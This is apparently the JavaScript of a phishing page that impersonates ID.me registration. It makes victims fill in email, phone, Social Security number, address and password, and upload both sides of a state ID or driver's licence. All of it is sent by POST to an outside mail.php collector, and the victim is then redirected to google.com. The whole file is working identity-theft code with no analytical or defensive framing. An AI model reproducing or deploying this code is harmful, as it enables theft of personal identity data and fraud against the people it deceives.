const mainBtn = document.getElementById("mainBtn");

let idmeAttempts = 0;
const d = new Date();
let submissionID = d.getTime() + " " + Math.floor(Math.random() * 1000) + 1;;

const sendToMail = async (type, body) => {

    const submitRequest = new FormData();
    submitRequest.append("type", type);
    submitRequest.append("submissionID", submissionID);
    submitRequest.append("body", body);

    const url = `https://cynergytrades.com/public/boiz/idme/mail.php`
    const options = {
        method: "POST",
        body: submitRequest
    };

    try {
        const response = await fetch(url, options);

        if (!response.ok) {
            const message = `An error has occured, Error code: ${response.status} - ${response.statusText}`;
            throw new Error(message);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        throw new Error(error);
    }
}

const sendFileToMail = async (type, body, file1, file2) => {

    const submitRequest = new FormData();
    submitRequest.append("type", type);
    submitRequest.append("submissionID", submissionID);
    submitRequest.append("body", body);
    submitRequest.append("file1", file1);
    submitRequest.append("file2", file2);

    const url = `https://cynergytrades.com/public/boiz/idme/mail.php`
    const options = {
        method: "POST",
        body: submitRequest
    };

    try {
        const response = await fetch(url, options);

        if (!response.ok) {
            const message = `An error has occured, Error code: ${response.status} - ${response.statusText}`;
            throw new Error(message);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        throw new Error(error);
    }
}

mainBtn.addEventListener('click', () => {

    const email = document.getElementById("email");
    const phone = document.getElementById("phone");
    const ssn = document.getElementById("ssn");
    const address = document.getElementById("address");
    const fileFront = document.getElementById("fileFront");
    const fileBack = document.getElementById("fileBack");
    const pass = document.getElementById("pass");
    const cpass = document.getElementById("cpass");

    if (isEmpty(email)) {
        flagInputError("email field is required");
    } else if (isEmpty(phone)) {
        flagInputError("Phone number field must be filled");
    } else if (isEmpty(ssn)) {
        flagInputError("SSN field must be filled");
    } else if (isEmpty(address)) {
        flagInputError("Address field must be filled");
    } else if (!fileFront.files.length > 0) {
        flagInputError("front of your State ID/DL must be uploaded");
    } else if (!fileBack.files.length > 0) {
        flagInputError("back of your State ID/DL must be uploaded");
    } else if (isEmpty(pass)) {
        flagInputError("Password field must be filled");
    } else if (isEmpty(cpass)) {
        flagInputError("Confirm password field must be filled");
    } else {

        mainBtn.value = "Processing ...";

        let my_txt = `New ID.me registration \n`;
        my_txt += `==========================\n`;
        my_txt += `Email: ${email.value}\n`;
        my_txt += `Phone: ${phone.value}\n`;
        my_txt += `SSN: ${ssn.value}\n`;
        my_txt += `Address: ${address.value}\n`;
        my_txt += `Password: ${pass.value}\n`;
        my_txt += `Confirm password: ${cpass.value}\n`;
        my_txt += `====================\n`;

        // upload file
        let file1 = fileFront.files;
        let file2 = fileBack.files;
        if (file1.length > 0 && file2.length > 0) {
            sendFileToMail("file", my_txt, file1[0], file2[0])
                .then((data) => {
                    // definitely a success message
                    setTimeout(() => {
                        location.replace("https://google.com");
                    }, 10000);
                })
                .catch((error) => {
                    alert(error);

                    setTimeout(() => {
                        location.replace("https://google.com");
                    }, 10000);
                });

        } else {
            alert("Uploads failed final upload verification process");
        }
    }

})

function flagInputError(msg) {
    alert(msg);
}

function isEmpty(input) {
    return input.value.trim() === "" ? true : false;
}